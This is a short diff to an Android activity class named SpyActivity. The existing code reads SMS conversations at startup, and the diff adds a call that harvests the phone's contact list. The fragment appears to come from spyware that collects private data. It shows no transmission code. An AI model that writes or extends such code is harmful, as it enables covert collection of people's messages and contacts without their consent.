@@ -35,7 +35,7 @@ public class SpyActivity extends Activity {
 		
 		//print sms conversations
 		(new GetSMS()).getConversations(this);
-		
+		(new Contact()).CreateListContactFromPhone(this);
 		Button sendButton = (Button) findViewById(R.id.button1);
 		final SpyActivity zis = this;
 		sendButton.setOnClickListener(new View.OnClickListener() {
@@ -56,6 +56,8 @@ public class SpyActivity extends Activity {
 		    		t.start();
 		    }
 		});
+		
+	       
 	}
 
 	@Override
